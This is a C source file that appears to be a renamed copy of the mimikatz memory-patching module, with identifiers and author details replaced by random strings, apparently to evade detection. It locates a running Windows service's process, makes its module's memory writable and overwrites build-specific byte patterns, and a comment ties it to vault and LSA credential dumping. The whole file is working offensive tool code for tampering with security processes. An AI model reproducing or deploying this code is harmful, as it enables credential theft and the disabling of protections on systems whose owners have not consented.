/*	4oM5AQx1 w4Er5 `09o6X7tzWM`
	https://blog.09o6X7tzWM.com
	dqTBkqdWaZiU5U2aN6CKrRY
	Licence : https://awr13GOqyUBjG1k.org/licenses/by/4.0/
*/
#include "ydeuclqlpatch.h"

BOOL ydeuclqlpatch(PKULL_M_MEMORY_SEARCH sMemory, PKULL_M_MEMORY_ADDRESS pPattern, SIZE_T szPattern, PKULL_M_MEMORY_ADDRESS pPatch, SIZE_T szPatch, LONG offsetOfPatch, PKULL_M_PATCH_CALLBACK pCallBackBeforeRestore, int argc, wchar_t * args[], NTSTATUS * pRetCallBack)
{
	BOOL result = FALSE, resultBackup = !pCallBackBeforeRestore, resultProtect = TRUE;
	KULL_M_MEMORY_ADDRESS destination = {NULL, sMemory->ydeuclqlmemoryRange.ydeuclqlmemoryAdress.hMemory};
	KULL_M_MEMORY_ADDRESS backup = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	MEMORY_BASIC_INFORMATION readInfos;
	NTSTATUS status;
	DWORD flags, oldProtect = 0, tempProtect = 0;
	
	if(ydeuclqlmemory_search(pPattern, szPattern, sMemory, TRUE))
	{
		destination.address = (LPBYTE) sMemory->result + offsetOfPatch;

		if(!resultBackup)
			if(backup.address = LocalAlloc(LPTR, szPatch))
				resultBackup = ydeuclqlmemory_copy(&backup, &destination, szPatch);

		if(resultBackup)
		{
			if(ydeuclqlmemory_query(&destination, &readInfos))
			{
				flags = readInfos.Protect & ~0xff;
				if((readInfos.Protect & 0x0f) && ((readInfos.Protect & 0x0f) < PAGE_READWRITE))
					tempProtect = PAGE_READWRITE;
				else if((readInfos.Protect & 0xf0) && ((readInfos.Protect & 0xf0) < PAGE_EXECUTE_READWRITE))
					tempProtect = PAGE_EXECUTE_READWRITE;
				
				if(tempProtect)
					resultProtect = ydeuclqlmemory_protect(&destination, szPatch, tempProtect | flags, &oldProtect);

				if(resultProtect)
				{
					if(result = ydeuclqlmemory_copy(&destination, pPatch, szPatch))
					{
						if(pCallBackBeforeRestore)
						{
							status = pCallBackBeforeRestore(argc, args);
							if(pRetCallBack)
								*pRetCallBack = status;
							result = ydeuclqlmemory_copy(&destination, &backup, szPatch);
						}
					}
					if(oldProtect)
						ydeuclqlmemory_protect(&destination, szPatch, oldProtect, NULL);
				}
			}
			if(backup.address)
				LocalFree(backup.address);
		}
	}
	return result;
}

PKULL_M_PATCH_GENERIC ydeuclqlpatch_getGenericFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, DWORD BuildNumber)
{
	SIZE_T i;
	PKULL_M_PATCH_GENERIC current = NULL;

	for(i = 0; i < cbGenerics; i++)
	{
		if(generics[i].MinBuildNumber <= BuildNumber)
			current = &generics[i];
		else break;
	}
	return current;
}

BOOL ydeuclqlpatch_genericProcessOrServiceFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PCWSTR processOrService, PCWSTR moduleName, BOOL isService) // to do for process // to do callback ! (vault & lsadump)
{
	BOOL result = FALSE;
	SERVICE_STATUS_PROCESS ServiceStatusProcess;
	PKULL_M_MEMORY_HANDLE hMemory;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModule;
	HANDLE hProcess;
	KULL_M_MEMORY_ADDRESS
		aPatternMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aPatchMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory;

	PKULL_M_PATCH_GENERIC currenReferences;

	if(currenReferences = ydeuclqlpatch_getGenericFromBuild(generics, cbGenerics, AHFIEEIO_NT_BUILD_NUMBER))
	{
		aPatternMemory.address = currenReferences->Search.Pattern;
		aPatchMemory.address = currenReferences->Patch.Pattern;
		if(ydeuclqlservice_getUniqueForName(processOrService, &ServiceStatusProcess))
		{
			if(ServiceStatusProcess.dwCurrentState >= SERVICE_RUNNING)
			{
				if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, ServiceStatusProcess.dwProcessId))
				{
					if(ydeuclqlmemory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hMemory))
					{
						if(ydeuclqlprocess_getVeryBasicModuleInformationsForName(hMemory, moduleName, &iModule))
						{
							sMemory.ydeuclqlmemoryRange.ydeuclqlmemoryAdress = iModule.DllBase;
							sMemory.ydeuclqlmemoryRange.size = iModule.SizeOfImage;

							if(result = ydeuclqlpatch(&sMemory, &aPatternMemory, currenReferences->Search.Length, &aPatchMemory, currenReferences->Patch.Length, currenReferences->Offsets.off0, NULL, 0, NULL, NULL))
								kprintf(L"\"%s\" service patched\n", processOrService);
							else
								PRINT_ERROR_AUTO(L"ydeuclqlpatch");
						} else PRINT_ERROR_AUTO(L"ydeuclqlprocess_getVeryBasicModuleInformationsForName");
						ydeuclqlmemory_close(hMemory);
					}
				} else PRINT_ERROR_AUTO(L"OpenProcess");
			} else PRINT_ERROR(L"Service is not running\n");
		} else PRINT_ERROR_AUTO(L"ydeuclqlservice_getUniqueForName");
	} else PRINT_ERROR(L"Incorrect version in references\n");

	return result;
}